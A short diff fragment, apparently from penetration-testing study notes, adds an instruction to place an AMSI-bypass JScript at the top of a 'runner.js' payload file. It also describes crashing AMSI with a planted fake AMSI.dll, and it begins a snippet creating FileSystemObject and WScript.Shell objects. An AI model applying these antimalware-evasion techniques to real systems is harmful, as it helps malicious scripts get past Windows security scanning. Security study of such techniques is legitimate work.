@@ -19,6 +19,8 @@ try{
 
 Bypass2: putting any file with name AMSI.dll in same folder of script to crash AMSI
 
+Put below script to bypass AMSI while using JSCript, at top of runner.js. Generate it by following methods mentioned in 4.2.2
+
 var filesys= new ActiveXObject("Scripting.FileSystemObject");
 var sh = new ActiveXObject('WScript.Shell');
 try
